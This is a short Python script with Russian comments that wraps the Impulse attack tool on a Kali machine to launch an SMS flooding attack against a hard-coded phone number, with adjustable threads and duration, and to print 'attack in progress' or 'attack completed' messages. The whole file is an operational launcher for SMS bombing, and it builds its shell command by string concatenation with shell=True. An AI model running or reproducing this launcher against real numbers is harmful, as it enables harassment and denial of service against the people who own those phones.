# -*- coding: utf-8 -*-
import subprocess

def start_attack(par_time=5, par_threads=1, par_number=+79206369642):
	"""	Эта функция производит запуск файла Impusle.py с заданными параметрами  time, threads, number
	И возвращает сообщение об успешном запуске, либо о получении ошибки
	return(process)"""
	result = subprocess.run(["python3 /home/kali/Impulse/impulse.py --method SMS --threads "+ str(par_threads)+ " --time " + str(par_time)+ " --target " + str(par_number)],
							shell = True,
							capture_output = True,
							text = True,
							timeout = 5*int(par_time))
	if result != 0:
		return result.stdout
	return result

res = start_attack()
print(res)
"""while res != 0:
	answer = "Идет атака"
	print (answer)
else:
	answer = "Атака завершена"
	print (answer)
"""
#[!] Attack completed!
#program_execution

